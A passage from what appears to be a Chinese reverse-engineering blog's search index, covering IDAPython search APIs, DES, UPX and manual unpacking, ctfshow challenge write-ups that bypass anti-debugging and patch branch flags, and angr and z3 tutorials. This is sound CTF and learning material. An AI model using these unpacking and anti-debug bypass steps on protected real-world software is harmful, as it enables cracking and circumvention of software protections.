16SEARCH_NOSHOW = 32SEARCH_IDENT = 128SEARCH_BRK = 256 我们只需要知道最常用的那几个 SEARCH_UP和SEARCH_DOWN用于选择我们希望搜索遵循的方向（升序or降序） SEARCH_NEXT用于获取下一个找到的对象 SEARCH_CASE用于指定大小写敏感性 SEARCH_NOSHOW不显示搜索进度 IDA以前的版本包含一个SEARCH_UNICODE的sflag来搜索Unicode字符串。在搜索字符时不再需要这个标志，因为IDA在默认情况下同时搜索ASCII和Unicode。 接下来我们来看看下面这个实例： 123456789101112pattern = &#x27;55 8B EC&#x27;addr = idc.get_inf_attr(INF_MIN_EA)for x in range(0, 5): addr = ida_search.find_binary(addr, idc.BADADDR, pattern, 16,ida_search.SEARCH_DOWN) if addr != idc.BADADDR: print(&quot;0x%x %s&quot; % (addr, idc.generate_disasm_line(addr, 0)))Python&gt;0x401000 push ebp0x401000 push ebp0x401000 push ebp0x401000 push ebp0x401000 push ebp 在第一行我们定义我们的搜索模式。搜索模式可以是以0x开头的十六进制格式，如0x55 0x8B 0xEC或以字节形式出现在IDA的十六进制视图55 8B EC，idc.get_inf_attr(INF_MIN_EA) 被用来获取可执行文件中的第一个地址，然后我们将使用 ida_search.find_binary(start, end, searchstr, radiux, sflag) 的回报分配给一个叫做 addr 的变量 当搜索时，重要的是验证搜索是否找到了模式，这可以通过比较addr和idc.BADADDR来测试。 不知道你有没有注意到，下面回显的结果地址并没有改变。这是因为我们没有传递SEARCH_NEXT标志。如果没有传递这个标志，当前地址将被用来搜索模式。如果最后一个地址包含了我们的字节模式，那么搜索将永远不会通过它来增量。下面是更正后的版本： 12345678910111213pattern = &#x27;55 8B EC&#x27;addr = idc.get_inf_attr(INF_MIN_EA)for x in range(0, 5): addr = ida_search.find_binary(addr, idc.BADADDR, pattern, 16, ida_search.SEARCH_NEXT|ida_search.SEARCH_DOWN) if addr != idc.BADADDR: print(&quot;0x%x %s&quot; % (addr, idc.generate_disasm_line(addr, 0))Python&gt;0x401000 push ebp0x401040 push ebp0x401070 push ebp0x4010e0 push ebp0x401150 push ebp 可以看到我们在SEARCH_DOWN之前加上SEARCH_NEXT标志（注意需要加上|进行分隔） 字符串查找：ida_search.find_text搜索字节模式很有用，但有时我们可能想搜索字符串，如 “chrome.dll”。我们可以用[hex(y) for y in bytearray(“chrome.dll”)]将字符串转换为十六进制字节，但这有点难看 另外，如果字符串是Unicode，我们就必须考虑到这种编码。最简单的方法是使用 ida_search.find_text(ea, y, x, searchstr, sflag) 这些字段大部分看起来都很熟悉，因为它们与 ida_search.find_binary 相同。 ea 是起始地址。y 是 ea 处要搜索的行数，x 是该行的坐标。y和x这两个字段通常分配为0。 searchstr是要搜索的模式，sflag定义了要搜索的方向和类型 我们来看一个例子： 12345678910111213141516Python&gt;cur_addr = idc.get_inf_attr(INF_MIN_EA)for x in range(0, 5): cur_addr = ida_search.find_text(cur_addr, 0, 0, &quot;Accept&quot;,ida_search.SEARCH_DOWN) if addr == idc.BADADDR: break print(&quot;0x%x %s&quot; % (cur_addr, idc.generate_disasm_line(cur_addr, 0))) cur_addr = idc.next_head(cur_addr)Python&gt;0x40da72 push offset aAcceptEncoding; &quot;Accept-Encoding:\\n&quot;0x40face push offset aHttp1_1Accept; &quot; HTTP/1.1\\r\\nAccept: */* \\r\\n &quot;0x40fadf push offset aAcceptLanguage; &quot;Accept-Language: ru \\r\\n&quot;...0x423c00 db &#x27;Accept&#x27;,00x423c14 db &#x27;Accept-Language&#x27;,00x423c24 db &#x27;Accept-Encoding&#x27;,00x423ca4 db &#x27;Accept-Ranges&#x27;,0 由于我们通过调用 idc.next_head(ea) 手动增加地址，我们不需要 SEARCH_NEXT 标志。我们手动将当前地址递增到下一行的原因是一个字符串可以在一行中出现多次。这可能会使获取下一个字符串的地址变得很棘手。 有一个以 “is “开头的API子集，可以用来确定一个地址的类型。这些API返回一个真或假的布尔值： idc.is_code(f)：如果ida标记该地址为代码，则返回真 idc.is_data(f)：如果ida标记该地址为数据，返回真 idc.is_tail(f)：如果ida标记改地址为尾部，返回真 idc.is_unknown(f)：如果IDA将该地址标记为未知，则返回True。这种类型用于当IDA还没有 识别地址是代码还是数据时使用该类型 idc.is_head(f)：如果IDA标记改地址为头部，返回真 这个f对我们来说是新的。我们不是传递地址，而是首先需要得到内部标志的表示，然后将其传递给我们的 idc.is_* 集合的函数。为了得到内部标志，我们使用idc.get_full_flags(ea) 1234Python&gt;print(&quot;0x%x %s&quot; % (ea, idc.generate_disasm_line(ea, 0)))0x10001000 push ebpPython&gt;idc.is_code(idc.get_full_flags(ea))True 除了前面描述的模式搜索外，还有几个函数可以用来查找其他类型。查找API的命名惯例使我们很容易推断其整体功能。 其它查找模式查找下一段代码：ida_search.find_code(ea,flag)它被用来寻找被标记为代码的下一个地址。如果我们想找到一个数据块的结尾，这就很有用。如果ea是一个已经被标记为代码的地址，它会返回下一个地址 flag的使用与之前在ida_search.find_text中描述的一样 12345Python&gt;print(&quot;0x%x %s&quot; % (ea, idc.generate_disasm_line(ea, 0)))0x4140e8 dd offset dword_4140ECPython&gt;addr = ida_search.find_code(ea, SEARCH_DOWN|SEARCH_NEXT)Python&gt;print(&quot;0x%x %s&quot; % (addr, idc.generate_disasm_line(addr, 0)))0x41410c push ebx 可以看到，通过调用这个单一的函数，我们跳过了36个字节的数据，得到了一个标记为代码的部分的开始 查找下一段数据：ida_search.find_data(ea,flag)返回下一个标记为数据块的地址 12345Python&gt;print(&quot;0x%x %s&quot; % (ea, idc.generate_disasm_line(ea, 0)))0x41410c push ebxPython&gt;addr = ida_search.find_data(ea, SEARCH_UP|SEARCH_NEXT)Python&gt;print(&quot;0x%x %s&quot; % (addr, idc.generate_disasm_line(addr, 0)))0x4140ec dd 49540E0Eh, 746E6564h, 4570614Dh, 7972746Eh, 8, 1, 4010BCh 查找下一段未识别：ida_search.find_unknown(ea,flag)这个功能是用来查找IDA没有识别为代码或数据的字节的地址。未知的类型需要进一步的人工分析，可以通过视觉或脚本来进行 12345Python&gt;print(&quot;0x%x %s&quot; % (ea, idc.generate_disasm_line(ea, 0)))0x406a05 jge short loc_406A3APython&gt;addr = ida_search.find_unknown(ea, SEARCH_DOWN)Python&gt;print(&quot;0x%x %s&quot; % (addr, idc.generate_disasm_line(addr, 0))))0x41b004 db 0DFh ; ? 查找下一段已识别：ida_search.find_defined(ea,flag)寻找ida识别为代码或数据的地址 12340x41b900 db ? ;Python&gt;addr = ida_search.find_defined(ea, SEARCH_UP)Python&gt;print(&quot;0x%x %s&quot; % (addr, idc.generate_disasm_line(addr, 0))))0x41b5f4 dd ? 尽管看起来没有任何有用的数据，但我们可以通过查看引用可以看到他确实被用到了 1234Python&gt;for xref in idautils.XrefsTo(addr, 1):print(&quot;0x%x %s&quot; % (xref.frm, idc.generate_disasm_line(addr, 0))))Python&gt;0x4069c3 mov eax, dword_41B5F4[ecx*4] 查找特定值：ida_search.find_imm(ea,flag,value)比起搜索一个类型，我们可能想搜索一个特定的值。比如说，我们感觉代码调用rand来生成一个随机数，但我们找不到代码。如果我们知道 rand 使用值 0x343FD 作为种子，我们可以通过 ida_search.find_imm ( get_inf_attr( INF_MIN_EA ), SEARCH_DOWN, 0x343FD ) 搜索这个数字 123456Python&gt;addr = ida_search.find_imm(get_inf_attr(INF_MIN_EA), SEARCH_DOWN, 0x343FD )Python&gt;addr[268453092, 0]Python&gt;print(&quot;0x%x %s %x&quot; % (addr[0], idc.generate_disasm_line(addr[0], 0), addr[1]))0x100044e4 imul eax, 343FDh 0 ida_search.find_imm 返回一个元组。元组中的第一项是地址，第二项是操作数。和 idc.print_operand 的返回一样，第一个操作数从零开始。当我们打印地址和反汇编时，我们可以看到值是第二个操作数 在某些情况下，使用ida_search.find_*搜索会有点慢。Yara可以用来加快IDA的搜索速度。请参阅Yara一章，了解在IDA中使用Yara来加速搜索的更多细节 选择数据idc.read_selection_start() 获取选择部分的起始地址 idc.read_selection_end() 获取选择部分的结束地址 需要注意的是结束地址不是最后一条指令的地址，而是最后一条指令下一条指令的地址 如果我们希望只做一个API调用，我们可以使用idaapi.read_selection() 获取数据idc.get_wide_byte(ea) idc.get_wide_word(ea) idc.get_wide_dword(ea) idc.get_qword(ea) idc.GetFloat(ea) idc.GetDouble(ea) idc.get_bytes(ea, size, use_dbg&#x3D;False) 注释和重命名暂无 着色暂无 如果你有兴趣改变IDA的颜色主题，我建议你去看看IDASkins11项目 ———————————————————————————————————————————————————————————— 原文链接：https://blog.csdn.net/m0_53342264/article/details/127477778","categories":[{"name":"逆向相关","slug":"逆向相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/"},{"name":"工具相关","slug":"逆向相关/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"Python文件读写相关","slug":"Python文件读写相关","date":"2024-01-28T13:01:01.000Z","updated":"2024-01-29T02:16:42.118Z","comments":true,"path":"2024/01/28/Python文件读写相关/","link":"","permalink":"http://example.com/2024/01/28/Python%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E7%9B%B8%E5%85%B3/","excerpt":"","text":"Python文件读写相关open() 方法open()方法用于打开文件并返回一个文件对象，允许用户进行读取、写入、追加等操作 1file = open(file_name [, mode=&#x27;r&#x27; [ , buffering=-1 [ , encoding = None ]]]) 在这个格式中，用[]括起来的部分为可选参数，即可以使用也可以省略 具体来说： file_name：打开或创建文件的文件名称，如果文件和当前执行的代码文件位于同一目录，可以简单地写文件名；否则，需要指定打开文件所在的完整路径 mode：打开的模式（可选参数），模式有以下几种（常见的有&#39;r&#39;,&#39;w&#39;,&#39;rb&#39;,&#39;wb&#39;等）： r：只读模式，用于读取文件内容 w：写入模式，如果文件不存在则创建，如果文件已经存在则覆盖原有文件 a：追加模式，如果文件不存在则创建，如果文件已经存在则添加内容到文件末尾 x：独占写入模式，如果文件不存在则创建，如果文件已经存在则抛出异常 b：二进制模式，用于读取或写入二进制文件 buffering：用于指定对文件做读写操作时，是否使用缓冲区。如果设置为-1，表示不限制缓冲区的大小 encoding：手动设定打开文件时所使用的编码格式。不同的平台有不同的编码参数值，例如在Windows上，其默认为cp936（实际上是GBK编码） 在使用完文件之后，必须调用close()方法关闭文件。否则，可能会导致文件内容丢失或损坏 seek()方法seek()是文件对象的方法之一，用于移动文件指针到指定的位置 1file.seek(offset[, whence]) 在这个格式中，用[]括起来的部分为可选参数，即可以使用也可以省略 具体来说： file：文件对象 offset：偏移量，从起始位置往后或往前的字节数，可以是正数或负数 whence：起始位置，可以是（默认情况下，whence 参数的值为 0） 0：表示从文件起始位置开始计算偏移量，此时 offset 参数必须为非负数 1：表示从当前位置开始计算偏移量 2：表示从文件末尾位置开始计算偏移量，此时 offset 参数必须为非正数 read()方法read()是文件对象的方法之一，用于读取指定长度字符 1python file.read([size]) 在这个格式中，用[]括起来的部分为可选参数，即可以使用也可以省略 当不规定读取多少字符时，读的时文件的全部字符 write()方法write()是文件对象的方法之一，用于向文件中写入指定内容 1file.write(string) 其中，file表示文件对象，string表示要写入文件的字符串（或字节串，仅适用于写入二进制文件） 注意，在使用 write() 向文件中写入数据，需保证使用 open() 函数是以 r+、w、w+、a 或 a+ 的模式打开文件，否则执行 write()函数会抛出 io.UnsupportedOperation 错误。 close()方法在写入文件完成后，一定要调用 close() 函数将打开的文件关闭，否则写入的内容不会保存到文件中 1file.close() 除此之外，如果向文件写入数据后，不想马上关闭文件，也可以调用文件对象提供的 flush() 函数，它可以实现将缓冲区的数据写入文件中 1file.flush() 通过设置 open() 函数的 buffering 参数可以关闭缓冲区，这样数据就可以直接写入文件中了。但是需要注意的是，对于以二进制格式打开的文件，可以不使用缓冲区，写入的数据会直接进入磁盘文件；但对于以文本格式打开的文件，必须使用缓冲区，否则 Python 解释器会 ValueError 错误","categories":[{"name":"Python相关","slug":"Python相关","permalink":"http://example.com/categories/Python%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"DES加解密","slug":"DES加解密","date":"2024-01-27T09:30:54.000Z","updated":"2024-01-27T10:34:27.907Z","comments":true,"path":"2024/01/27/DES加解密/","link":"","permalink":"http://example.com/2024/01/27/DES%E5%8A%A0%E8%A7%A3%E5%AF%86/","excerpt":"","text":"DES加解密DES是一种对称加密 主要的流程是： 初始置换，也称 IP置换 加密轮次，共16轮次 逆置换，也称 FP置换 1. IP置换IP置换是将输入的64位明文块进行置换和重新排列，生成新的64位数据块（不够64位需要补位填充，高于64位需要分组加密） 我们将把64位的顺序按下表中规定的顺序放置，图中的数字是在64位明文中每个比特的索引位置。注意，在DES中，这个置放规则是固定的 2. 加密轮次初始置换完成后，明文被划分成了相同长度（32位)的左右两部分，记作L0,R0。接下来进行16轮次的加密 每轮加密方式是一样的，我们就讲第一轮： 右半部分R0先是直接作为下一轮的左半部分（也就是L1），然后将R0补位到48位与K0（K0也是48位，K0的生成后面讲）作为参数进入F轮函数中，F轮函数得到的32位的输出结果与左半部分L0进行异或，得到的结果作为下一轮的右半部分（也就是R1） 以此类推，重复16轮次 2.1 F轮函数总览： 2.1.1 拓展R按下表对R进行拓展，这个拓展规则也是固定的 2.1.2 生成K每轮的子密钥K都是由主密钥生成的，DES算法的密钥调度算法可以将64位的主密钥分成16个子密钥，每个子密钥都是48位 将64位主密钥经过第一次置换，输出56位，分为左右两个28位的数据块，记为C0和D0，置换规则是固定的： 从置换表中可以看出，舍弃掉的8位数据是原始数据中每8位数据的最后一位 对C0和D0进行循环左移操作，在16轮加加密轮次中，当轮数 i &#x3D; 1,2,9或16时，循环左移1位，否则循环左移2位 ，然后得到C1-16和D1-16 对Ci和Di经过第二次置换得到48位的子密钥Ki，置换规则也是固定的： 2.1.3 R与K异或拓展Ri与子密钥Ki进行异或运算，输出结果作为S盒替换的输入 2.1.4 S盒替换S盒替换是一种在密码学中广泛使用的加密技术，它是将明文中的一组比特映射到密位中的一组比特的过程。DES中使用S盒替换将异或运算得到的48位结果映射到32位输出中去 S盒也是一种置换表，但是每一轮加密计算中S盒都是不一样的，这里就不一一列举了 S盒由8个S块组成，每个S块都会接收6位字符作为输入并输出4位字符 2.1.5 P盒替换P盒替换将S盒替换的32位输出作为输入，经过固定的替换表进行替换后即为最后F轮函数的结果 3. FP置换在经过16轮次计算后，DES会对最后的结果进行最后一次置换，作为最后的输出结果","categories":[{"name":"算法相关","slug":"算法相关","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"ctfshow-reverse-真的是签到","slug":"ctfshow-reverse-真的是签到","date":"2024-01-27T03:39:26.000Z","updated":"2024-03-11T00:22:13.335Z","comments":true,"path":"2024/01/27/ctfshow-reverse-真的是签到/","link":"","permalink":"http://example.com/2024/01/27/ctfshow-reverse-%E7%9C%9F%E7%9A%84%E6%98%AF%E7%AD%BE%E5%88%B0/","excerpt":"","text":"ctfshow-reverse-真的是签到附件用die查发现有aspack壳，用x32dbg尝试手动去壳 设好硬件断点 F9到断点，但是没发现jmp 继续执行发现又有pushad，怀疑还有一层壳 尝试再设一次硬件断点去这层壳，发现内存地址和上次设的断点地址一样 F9运行到popad处 在后面jmp前面设个断点然后F9（jne那是个循环，一个个点很慢） 进到jmp里面，该地址应该就是要dump的地址 dump 但是dump出来的文件还是有壳，回到jmp的地址（push ebp），往下步过发现有一处需要用户输入 随便输入些什么 发现回显try again 说明main函数可能就是这个函数，试试dump这个函数 dump出来的程序还是显示有壳，但是ida已经可以看出部分逻辑了 大部分逻辑可以看到，但是第13行的和第21行的函数没有dump出来，在x32dbg里可以看到是memcpy和strrev 稍加整理 写出脚本得到flag 123456789101112131415#include&lt;iostream&gt;unsigned char ida_chars[] =&#123; 0x6C, 0x2F, 0x30, 0x31, 0x32, 0x33, 0xFFFFFFB6, 0xFFFFFFBF, 0xFFFFFFA0, 0xFFFFFFCF, 0xFFFFFF7C, 0x71, 0x6A, 0x6C, 0x70, 0x64, 0x75, 0x63 &#125;;int main()&#123; int i; for (i = 17; i &gt;= 0; i--) &#123; ida_chars[i] ^= 17 - i; std::cout &lt;&lt; ida_chars[i]; &#125;&#125;//ctfshow&#123;签到?????&#125;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/categories/WriteUp/"},{"name":"Re","slug":"WriteUp/Re","permalink":"http://example.com/categories/WriteUp/Re/"}],"tags":[]},{"title":"ctfshow-reverse-红包题武穆遗书","slug":"ctfshow-reverse-红包题武穆遗书","date":"2024-01-27T03:13:14.000Z","updated":"2024-03-11T00:22:09.714Z","comments":true,"path":"2024/01/27/ctfshow-reverse-红包题武穆遗书/","link":"","permalink":"http://example.com/2024/01/27/ctfshow-reverse-%E7%BA%A2%E5%8C%85%E9%A2%98%E6%AD%A6%E7%A9%86%E9%81%97%E4%B9%A6/","excerpt":"","text":"ctfshow-reverse-红包题武穆遗书附件是一个exe，要去upx壳 ida看看逻辑 所以重点就是把反调试过了就可以了 法一：nop把反调试的一个个都nop掉，在进行比较的地方下好断点，直接调试到断点处就可以找到flag了 法二：attach在进行比较的地方下好断点，在windows运行附件，然后再ida-&gt;Debugger-&gt;Attach to process就可以过反调试了 先运行附件 然后attach to process 找到这个程序 随便输入一些东西 F9运行到断点 可以看到flag是放到了eax里，所以外面双击[eax]进去就可以看到flag","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/categories/WriteUp/"},{"name":"Re","slug":"WriteUp/Re","permalink":"http://example.com/categories/WriteUp/Re/"}],"tags":[]},{"title":"ctfshow-reverse-逆向5","slug":"ctfshow-reverse-逆向5","date":"2024-01-26T12:17:14.000Z","updated":"2024-03-11T00:22:05.879Z","comments":true,"path":"2024/01/26/ctfshow-reverse-逆向5/","link":"","permalink":"http://example.com/2024/01/26/ctfshow-reverse-%E9%80%86%E5%90%915/","excerpt":"","text":"ctfshow-reverse-逆向5下载下来的附件是一个dll和一个exe，exe直接运行是弹窗，确定弹窗后就没有了 用ida打开看看exe文件，可以看到这个函数里面是有加载dll的 一开始打算去直接分析dll，但是dll有加壳，太麻烦了，这时候发现Str这一字符串是已知的 而在上一级中可以看到有对Str[1]进行判断 而Str[1]明显不等于1，所以并不会进行 9 10 行的处理，所以尝试动调看看能不能得到flag，在判断这里做个断点 然后在刚刚对dll进行加载的那个函数return处下一个断点 dbg跑起来，运行到第一个断点的时候把ZF改为1，让程序通过判断 然后F9到第二个断点（好像这个断点不设也可以），可以看到命令行有东西输出了 尝试提交一下，是flag","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/categories/WriteUp/"},{"name":"Re","slug":"WriteUp/Re","permalink":"http://example.com/categories/WriteUp/Re/"}],"tags":[]},{"title":"脱壳入门","slug":"脱壳入门","date":"2024-01-25T13:07:04.000Z","updated":"2024-01-27T09:17:55.741Z","comments":true,"path":"2024/01/25/脱壳入门/","link":"","permalink":"http://example.com/2024/01/25/%E8%84%B1%E5%A3%B3%E5%85%A5%E9%97%A8/","excerpt":"","text":"脱壳入门工具脱壳简单UPXupx壳是最常见的其中一种壳，其中简单的upx壳都可以用工具去壳 在开始脱壳之前，要将需要脱壳的文件（upx壳的）拖入对应的32位或64位upx脱壳文件夹中并进入文件夹 然后使用 upx -d 文件名 这条命令即可去壳 注：在当前目录下cmd命令行输入upx可以查看关于upx的功能与使用方法 手动脱壳ESP法upx解压缩很有特点，先pushad然后解压缩最后popad，然后就是jmp到oep处了 首先，在执行完pushad后，在内存窗口查看当前栈地址（或者右键ESP&#x2F;RSP在内存窗口转到） 然后设置硬件断点 设好断点后F9即可运行到popad处，可以看到下面就是我们要找的jmp 进到jmp里面，就是我们要找的oep 然后打开插件Scylla，先 IAT Autosearch 再 Dump 就好了 来看看成果： 可以看到是成功了的","categories":[{"name":"逆向学习","slug":"逆向学习","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/"},{"name":"脱壳相关","slug":"逆向学习/脱壳相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/%E8%84%B1%E5%A3%B3%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"angr安装与学习","slug":"angr学习","date":"2024-01-24T08:03:07.000Z","updated":"2024-01-26T13:08:02.643Z","comments":true,"path":"2024/01/24/angr学习/","link":"","permalink":"http://example.com/2024/01/24/angr%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"angr安装与学习angr安装kali安装angr 安装virtualenv可以用pip或者apt来安装virtualenv 12pip install virtualenvapt-get install virtualenv 创建并启动virtualenv虚拟环境创建virtulenv虚拟环境之前需要安装好python 1mkdir angrfile &amp;&amp;cd angrfile 创建虚拟环境 12virtualenv venv #使用默认python解释器创建virtualenv -p /usr/bin/python2.7 venv #如果你想用其他python解释器，找到你要用的python路径并替换命令中路径后执行 启动虚拟环境 1source venv/bin/activate pip安装angr 1pip install angr 之后可以启动python，import一下angr看看安装好了没有 angr学习摘自angr_ctf——从0学习angr（一）：angr简介与核心概念 - Uiharu - 博客园 (cnblogs.com) angr官方文档: README - angr Documentation angr的API文档: angr API documentation — angr 9.2.26 documentation angr_ctf项目: GitHub - jakespringer&#x2F;angr_ctf 本篇以做angr_ctf中的题目的方式来学习angr angr与angr_ctf简介 angr是一个支持多处理架构的用于二进制文件分析的工具包，它提供了动态符号执行的能力以及多种静态分析的能力。项目创建的初衷，是为了整合此前多种二进制分析方式的优点，并开发一个平台，以供二进制分析人员比较不同二进制分析方式的优劣，并根据自身需要开发新的二进制分析系统和方式。 也正是因为angr是一个二进制文件分析的工具包，因此它可以被使用者扩展，用于自动化逆向工程、漏洞挖掘等多个方面。 angr_ctf则是一个专门针对angr的项目，里面有17个angr相关的题目。这些题目只有一个唯一的要求：你需要找出能够使程序输出“Good Job”的输入，这也是符号执行常见的应用场景。 angr核心概念顶层接口Project类是angr的主类，一般写在angr的最开始，通过初始化该类的对象，可以将你想要分析的二进制文件加载进来： 12import angrp = angr.Project(&#x27;./bin/true&#x27;) #注意Project的P大写 参数为需要分析的文件的路径，这个参数是唯一一个必须传入的参数，此外还有一个比较常用的参数load_options，它将指明加载的方式 名称 描述 传入参数 auto_loads_libs 是否自动加载程序的依赖 布尔 skip_libs 希望避免加载的库 库名 expect_missing_libs 无法解析库时是否抛出异常 布尔 force_load_libs 强制加载的库 库名 ld_path 共享库的优先搜索路径 路径名 比如我们可以少加载一些无关紧要的库提升angr的效率： 12import angrp = angr.Project(&#x27;./bin/true&#x27;,anto_loads_libs=false) Project类中有许多方法和属性，例如加载的文件名、架构、程序入口点、大小端等等 状态StateProject实际上只是将二进制文件加载进来了，要执行它，实际上是对SimState对象进行操作，它是程序的状态。 要创建状态，需要使用Project对象中的factory，它还可以用于创建模拟管理器和基本块（后面提到）： 1state = p.factory.entry_state() 预设状态有四种方式： 预设状态方式 描述 entry_state 初始化状态为程序运行到程序入口点处的状态 black_state(addr&#x3D;) 大多数数据都没有初始化，状态中下一条指令为addr处的指令 full_init_state 共享库和预定义内容已经加载完毕，例如刚加载完共享库 call_state 准备调用函数的状态 状态包含了程序运行时的一切信息，寄存器、内存的值、文件系统以及符号变量等 entry_state和blank_state是常用的两种方式，后者通常用于跳过一些极大降低angr效率的指令 模拟管理器上述方式只是预设了程序开始分析时的状态，我们要分析程序就必须要让它到达下一个状态，也就是让它动起来，这就需要模拟管理器的帮助（简称SM） 使用以下指令能创建一个SM，它需要传入一个state或者state的列表作为参数： 1simgr = p.factory.simgr(state) SM中有许多列表，这些列表被称为stash，它保存了处于某种状态的state，stash有如下几种： stash 描述 active 保存接下来可以执行并且将要执行的状态 deadended 由于某些原因不能继续执行的状态，例如没有合法指令，或者有非法指针 pruned 与solve的策略有关，当发现一个不可解的节点后，其后面所有的节点都优化掉放在pruned里 unconstrained 如果创建SM时启用了save_unconstrained，则被认定为不受约束的state会放在这，不受约束的state是指由用户数据或符号控制的指令指针（例如eip） unsat 如果创建SM时启用了save_unsat，则被认为不可满足的state会放在这里 默认情况下，state会被存放在active中 stash中的state可以通过move()方法来转移，将filter_func筛选出来的state从from_stash转移到to_stash： 1simgr.move(from_stash=&#x27;deadended&#x27;, to_stash=&#x27;more_than_50&#x27;, filter_func=lambda s: &#x27;100&#x27; in s.posix.dumps(1)) stash是一个列表，可以使用python支持的方式去遍历其中的元素，也可以使用常见的列表操作。但angr提供了一种更高级的方式，在stash名字前加上one_，可以得到stash中的第一个状态，加上mp_，可以得到一个mulpyplexed版本的stash 此外，稍微解释一下上面代码中的posix.dumps： state.posix.dumps(0):表示到达当前状态所对应的程序输入 state.posix.dumps(1):表示到达当前状态所对应的程序输出 上述代码就是将deadended中输出的字符串包含’100’的state转移到more_than_50这个stash中 step()可以通过step()方法来让处于active的state执行一个基本块，这种操作不会改变state本身： 12345678910111213141516摘自 https://www.cnblogs.com/level5uiharu/p/16925991.html&gt;&gt;&gt; state = p.factory.entry_state()&gt;&gt;&gt; simgr = p.factory.simgr(state)&gt;&gt;&gt; print(state.regs.rax, state.regs.rip)&lt;BV64 0x1c&gt; &lt;BV64 0x4023c0&gt;&gt;&gt;&gt; print(simgr.one_active)&lt;SimState @ 0x4023c0&gt;&gt;&gt;&gt; simgr.step()&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; print(simgr.one_active)&lt;SimState @ 0x529240&gt;&gt;&gt;&gt; print(state.regs.rax, state.regs.rip)&lt;BV64 0x1c&gt; &lt;BV64 0x4023c0&gt; 探索技术（explorer techniques）可以使用explorer方法去执行某个状态，直到找到目标指令或者active中没有状态为止，它有如下参数： find：传入目标指令的地址或地址列表，或者一个用于判断的函数，函数以state为形参，返回布尔值 avoid：传入要避免的指令的地址或地址列表，或者一个用于判断的函数，用于减少路径 explorer找到的符合find的状态会被保存在simgr.found这个列表当中，可以遍历其中元素获取状态 符号执行angr作为一个二进制分析的工具包，但它通常作为符号执行工具更为出名 符号执行就是给程序传递一个符号而不是具体的值，让这个符号伴随程序运行 当碰见分支时，符号会进入哪个分支呢？angr的回答是全都进入！angr会保存所有分支，以及分支后的所有分支，并且在分支时，保存进入该分支时的判断条件，通常这些判断条件是对符号的约束条件。当angr运行到目标状态时，就可以调用求解器对一路上收集到的约束进行求解，最终得到某个符号能够到达当前状态的值 实例使用angr一般分为如下步骤： 创建Project，预设state 创建位向量和符号变量，保存在内存&#x2F;寄存器&#x2F;文件或其他地方 将state添加到SM中 运行，探索满足条件的路径 约束求解获取执行结果 先逆向看看逻辑 程序接收一个25字节的输入，也就是s1，在enc1()函数中进行处理后，要和一串字符串相等，才能得到flag的part1，那么“You have successfully found part1……”这段输出就是我们要达到的目标 下面是针对这个程序flag的part1的angr脚本： 12345678910111213141516171819202122import angrp = angr.Project(&#x27;./O.o&#x27;) #二进制文件必须和exp在angrfile目录下state = p.factory.entry_state()simgr = p.factory.simgr(state)def good(state): tag = b&#x27;You have successfully found part1&#x27; in state.posix.dumps(1) return True if tag else Falsedef bad(state): tag = b&#x27;Sorry you got the wrong answer. Look again!!!&#x27; in state.posix.dumps(1) return True if tag else Falsesimgr.explore(find = good,avoid = bad)if simgr.found: solution = simgr.found[0] print(&quot;[+] The Solution: &quot;) print(solution.posix.dumps(0))else: print(&quot;[!] Could not find solution!&quot;)","categories":[{"name":"逆向相关","slug":"逆向相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/"},{"name":"工具相关","slug":"逆向相关/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"z3 简单使用","slug":"z3简单使用","date":"2024-01-23T08:03:07.000Z","updated":"2024-01-25T13:05:20.748Z","comments":true,"path":"2024/01/23/z3简单使用/","link":"","permalink":"http://example.com/2024/01/23/z3%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"z3简单使用安装Windows下安装1pip3 install z3-solver #注意这里是 z3-solver 而不是 z3 Linux下安装（没什么必要）123456git clone https://github.com/Z3Prover/z3.gitcd z3python scripts/mk_make.py cd build make make install 使用常用的几个API Solver()：创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解 add()：添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式，也就是方程 check()：通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会返回sat，无解的时候会返回unsat model()：在存在解的时候，该函数会将每个限制条件所对应的解集取交集，进而得出正解 语句 设未知数： 123from z3 import *x = Int(&#x27;x&#x27;)y = Int(&#x27;y&#x27;) 列方程： 123s = Solver()s.add(x + y == 5)s.add(2 * x + 3 * y == 14） 判断方程是否有解，有解则输出方程的解： 12345if s.check() == sat: result = s.model() print(result)else: print(&#x27;[!] NoReply&#x27;) 运用实例1234567891011121314151617181920212223242526272829303132333435from z3 import *a = Int(&#x27;a&#x27;)b = Int(&#x27;b&#x27;)c = Int(&#x27;c&#x27;)d = Int(&#x27;d&#x27;)e = Int(&#x27;e&#x27;)f = Int(&#x27;f&#x27;)g = Int(&#x27;g&#x27;)h = Int(&#x27;h&#x27;)i = Int(&#x27;i&#x27;)j = Int(&#x27;j&#x27;)k = Int(&#x27;k&#x27;)l = Int(&#x27;l&#x27;)s = Solver()s.add(138 * a + 204 * b + 874 * c + 387 * d + 713 * e + 833 * f + 974 * g + 999 * h + 128 * i + 698 * j + 790 * k + 469 * l == 626818)s.add(244 * a + 457 * b + 502 * c + 938 * d + 86 * e + 358 * f + 943 * g + 840 * h + 616 * i + 381 * j + 258 * k + 421 * l == 565019)s.add(361 * a + 472 * b + 773 * c + 220 * 